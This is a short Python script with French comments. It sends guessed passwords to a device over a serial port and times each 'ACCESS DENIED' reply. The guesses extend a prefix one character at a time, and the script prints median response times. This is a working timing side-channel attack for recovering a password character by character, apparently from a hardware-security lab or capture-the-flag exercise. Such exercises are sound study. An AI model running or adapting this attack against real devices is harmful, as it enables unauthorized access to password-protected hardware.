
import serial
import time
import statistics
import random

PORT = "COM11"  # the port to which the device is connected
BAUDRATE = 9600
N = 30

candidates = [
    "aaaaaaaa",
    "faaaaaaa",
    "f7aaaaaa",
    "f7-aaaaa"
]

results = {candidate: [] for candidate in candidates}

with serial.Serial(PORT, BAUDRATE, timeout=3) as ser:
    # Vider les anciennes données
    ser.reset_input_buffer()

    print("Connexion établie.")

    # Mélanger les essais pour réduire les biais temporels
    trials = candidates * N
    random.shuffle(trials)

    for candidate in trials:
        ser.reset_input_buffer()

        start = time.perf_counter_ns()
        ser.write((candidate + "\n").encode("ascii"))
        ser.flush()

        response = ser.read_until(b"Enter password:")
        elapsed_us = (time.perf_counter_ns() - start) / 1000

        if b"ACCESS DENIED" in response:
            results[candidate].append(elapsed_us)
        else:
            print("Réponse inattendue :", repr(response))

for candidate, values in results.items():
    if values:
        print(
            f"{candidate}: "
            f"médiane = {statistics.median(values):.1f} µs, "
            f"écart-type = {statistics.stdev(values):.1f} µs"
        )
